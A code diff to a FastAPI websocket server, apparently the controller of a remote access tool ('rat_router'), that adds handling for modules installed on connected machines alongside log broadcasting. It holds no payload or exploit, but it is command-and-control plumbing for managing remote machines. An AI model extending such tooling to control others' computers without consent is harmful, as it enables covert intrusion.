@@ -3,6 +3,7 @@ from fastapi import WebSocket, APIRouter, Request, WebSocketDisconnect
 import machines
 import con
 from uid import Uid, gen_uid
+from modules.all import MODULES
 
 rat_router = APIRouter()
 
@@ -23,8 +24,17 @@ async def machine_websocket_endpoint(websocket: WebSocket, version: int, machine
 		await machines.all[machine_id].on_connect(websocket.client.host)
 		while True:
 			data = await websocket.receive_json()
-			if data["event"] == "log":
-				await con.broadcast_log(machine_id, data["data"] if "data" in data else None, data["tags"] if "tags" in data else None)
+			match data["event"]:
+				case "log":
+					await con.broadcast_log(machine_id, data["data"] if "data" in data else None, data["tags"] if "tags" in data else None)
+				case "module":
+					await machines.all[machine_id].modules[data["module"]].handle_rat_message(data["data"])
+				case "module_installed":
+					machines.all[machine_id].modules[data["name"]] = MODULES[data["name"]](machine_id=machine_id)
+					await con.broadcast_machine_update(machines.all[machine_id])
+				case "module_uninstalled":
+					del machines.all[machine_id].modules[data["name"]]
+					await con.broadcast_machine_update(machines.all[machine_id])
 
 	except WebSocketDisconnect:
 		print(f"Machine {machine_id} left")
